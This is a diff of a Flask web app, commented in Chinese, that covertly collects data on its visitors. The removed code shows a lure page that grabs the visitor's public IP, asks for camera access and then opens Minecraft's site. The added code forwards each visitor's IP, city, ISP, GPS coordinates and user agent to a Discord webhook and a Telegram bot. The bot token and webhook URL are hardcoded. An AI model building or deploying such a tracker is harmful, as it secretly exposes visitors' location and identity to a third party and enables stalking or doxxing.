@@ -1,86 +1,39 @@
-from flask import Flask, request, render_template_string
+from flask import Flask, request, jsonify
 import requests
 
 app = Flask(__name__)
 
-BOT_TOKEN = "8831992575:AAFPvDrXc_kEiOiT0XHYgJj9E8KSWwR-aBo"
-CHAT_ID = "7763890817"
+# 私密配置，只写在后端，前端完全看不到
+TG_TOKEN = "8831992575:AAFPvDrXc_kEiOiT0XHYgJj9E8KSWwR-aBo"
+TG_CHATID = "7763890817"
+DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1534727827717488710/LLyLVdQiCLWMMX0Uu2TWis66L3DPmvo6Fu05XXKaEwA8Hgp2uSD8F5-B1_uhpZ5frQX4"
 
-# 推送消息到电报机器人
-def send_telegram_message(content):
-    api_url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
-    payload = {
-        "chat_id": CHAT_ID,
-        "text": content
-    }
-    requests.post(api_url, json=payload)
+# 主页路由，加载前端页面
+@app.route('/')
+def index():
+    with open("index.html","r",encoding="utf-8") as f:
+        html = f.read()
+    return html
 
-# 内嵌前端全部代码
-frontend_html = '''
-<!--下面整块是独立前端HTML-->
-<!DOCTYPE html>
-<html lang="zh-CN">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>信息采集</title>
-    <style>
-        body{font-family:Arial;text-align:center;margin-top:80px;}
-        button{padding:14px 30px;margin:10px;font-size:17px;cursor:pointer;border:none;background:#007AFF;color:white;border-radius:8px;}
-        video{margin-top:20px;border:1px solid #ccc;border-radius:6px;width:360px;}
-    </style>
-</head>
-<body>
-    <h2>点击下方按钮启动</h2>
-    <button onclick="startAll()">一键启动</button>
-    <br>
-    <video id="myCamera" autoplay playsinline></video>
-
-    <script>
-        async function startAll(){
-            try{
-                //1.获取并上报公网IP
-                let res = await fetch("https://api.ipify.org?format=json");
-                let json = await res.json();
-                let userIp = json.ip;
-
-                await fetch("/api/upload_ip",{
-                    method:"POST",
-                    headers:{"Content-Type":"application/json"},
-                    body:JSON.stringify({ip:userIp})
-                })
-                alert("IP已上报："+userIp);
-
-                //2.申请打开摄像头权限
-                const videoBox = document.getElementById("myCamera");
-                const mediaStream = await navigator.mediaDevices.getUserMedia({video:true})
-                videoBox.srcObject = mediaStream;
-
-                //3.新标签跳转MC官方网站
-                window.open("https://www.minecraft.net/zh-hans","_blank");
-
-            }catch(err){
-                alert("权限被拒绝或者出错："+err)
-            }
-        }
-    </script>
-</body>
-</html>
-'''
-
-#首页路由加载前端页面
-@app.route("/")
-def home_page():
-    return render_template_string(frontend_html)
-
-#后端接收IP数据接口
-@app.route("/api/upload_ip",methods=["POST"])
-def upload_ip():
+# 接口：接收前端传过来的访客数据，后端执行推送
+@app.route("/send_msg",methods=["POST"])
+def send_msg():
     data = request.get_json()
-    visitor_ip = data.get("ip","获取失败")
-    msg_text = f"新访客公网IP地址：{visitor_ip}"
-    send_telegram_message(msg_text)
-    return {"status":"success"}
+    content = f"""【第四代完整版访客采集记录】
+公网IP：{data['ip']}
+所属国家：{data['country']}
+城市：{data['city']}
+行政区：{data['region']}
+网络运营商：{data['isp']}
+GPS经纬度：{data['gps']}
+设备UA标识：{data['ua']}"""
+
+    #推送到Discord
+    requests.post(DISCORD_WEBHOOK,json={"content":content})
+    #推送到Telegram
+    requests.post(f"https://api.telegram.org/bot{TG_TOKEN}/sendMessage",
+                  json={"chat_id":TG_CHATID,"text":content})
+    return jsonify({"code":200,"msg":"发送成功"})
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0")
